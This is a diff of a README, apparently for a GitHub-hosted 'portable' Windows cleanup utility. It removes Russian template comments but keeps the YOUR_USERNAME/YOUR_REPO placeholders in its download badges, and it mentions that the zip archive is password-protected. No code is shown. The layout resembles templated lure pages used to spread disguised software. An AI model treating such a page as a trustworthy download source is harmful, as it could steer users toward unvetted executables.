@@ -3,8 +3,7 @@
 <div align="center">
   <h1>🧹 CalmTune System Helper</h1>
   <p>Compact, portable Windows 10/11 helper for careful cleanup, stability and everyday comfort ✨</p>
-
-  <!-- Замените ссылку ниже на ваш собственный скриншот -->
+  
   <img src="https://via.placeholder.com/1000x500?text=CalmTune+System+Helper+Preview" alt="CalmTune System Helper interface preview" width="80%">
 </div>
 
@@ -59,7 +58,6 @@ The text and interface aim to be **neutral and clear**, without harsh wording or
 ---
 
 <p align="center">
-  <!-- Замените YOUR_USERNAME и YOUR_REPO на реальные значения -->
   <a href="https://github.com/YOUR_USERNAME/YOUR_REPO/archive/refs/heads/main.zip" style="text-decoration:none;">
     <img src="https://img.shields.io/badge/⬇️_Download_CalmTune_System_Helper-zip-success?style=for-the-badge&logo=windows" alt="Download CalmTune System Helper">
   </a>
@@ -130,7 +128,6 @@ You will not be able to open the archive without this key, so it’s a good idea
 ---
 
 <p align="center">
-  <!-- Вторичная кнопка скачивания у инструкций -->
   <a href="https://github.com/YOUR_USERNAME/YOUR_REPO/archive/refs/heads/main.zip" style="text-decoration:none;">
     <img src="https://img.shields.io/badge/⬇️_Download_CalmTune_System_Helper_again-zip-blueviolet?style=for-the-badge&logo=windows" alt="Download CalmTune System Helper">
   </a>
